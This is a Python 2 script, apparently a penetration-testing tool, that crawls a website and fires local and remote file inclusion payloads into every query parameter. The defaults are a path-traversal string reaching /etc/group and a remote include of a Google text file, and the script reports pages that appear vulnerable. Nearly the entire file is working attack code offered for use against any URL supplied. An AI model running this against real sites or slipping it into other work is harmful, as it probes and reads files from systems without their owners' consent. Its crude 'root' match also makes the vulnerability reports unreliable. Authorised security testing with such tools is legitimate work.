#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# by @aetsu
#
# Use: fi.py url <payloads dictionary>
#
import re
import urlparse
import requests
import sys


def getUrls(tarurl):
    urls = []

    print (" [+] Finding urls....")
    url = requests.get(tarurl)
    urls.append(str(tarurl))
    for u in re.findall('''href=["'](.[^"']+)["']''', url.text, re.I):
        try:
            if u[:4] == "http":
                if tarurl in u:
                    urls.append(str(u))
            elif u[0] == "/":
                combline = tarurl + u
                urls.append(str(combline))
            else:
                combline = tarurl + '/' + u
                urls.append(str(combline))
        except:
            pass
    return urls


def findLfi(urls, payloads):
    for url in urls:

        parsed = urlparse.urlparse(url)
        parameters = urlparse.parse_qs(parsed.query)
        newurl = urlparse.urljoin((parsed.scheme + "://" + parsed.netloc), parsed.path)

        print ""
        print " -> Url : " + url

        for payload in payloads:
            for p in parameters:
                parameters[p] = payload
            try:
                req = requests.get(newurl, params=parameters)

                if 'root' in req.text:
                    print chr(27) + "[1;31m" + "     The url " + chr(27) + "[0m" + url
                    print chr(27) + "[1;31m" + "     is possibly vulnerable to LFI!" + chr(27) + "[0m"
                    print "     Payload: " + payload
                    print ""

                elif "Google is built by a large team of engineers, designers" in req.text:
                    print chr(27) + "[1;31m" + "     The url " + chr(27) + "[0m" + url
                    print chr(27) + "[1;31m" + "     is possibly vulnerable to RFI!" + chr(27) + "[0m"
                    print "     Payload: " + payload
                    print ""

            except:
                print " <- Error opening " + url
                break

        print '==========================================================='
        print ''


def main():
    print ""
    print ""
    print "                 LFI & RFI finder"
    print ""
    print "                                                     by @aetsu"
    print ""
    if len(sys.argv) < 3:
        payloads = ['../../../../../../../../../../../../../../../../../../../etc/group', 'http://www.google.es/humans.txt']
    else:
        filename = sys.argv[2]
        payloads = [line.rstrip('\n') for line in open(filename)]

    urls = getUrls(sys.argv[1])
    findLfi(urls, payloads)


if __name__ == "__main__":
    main()
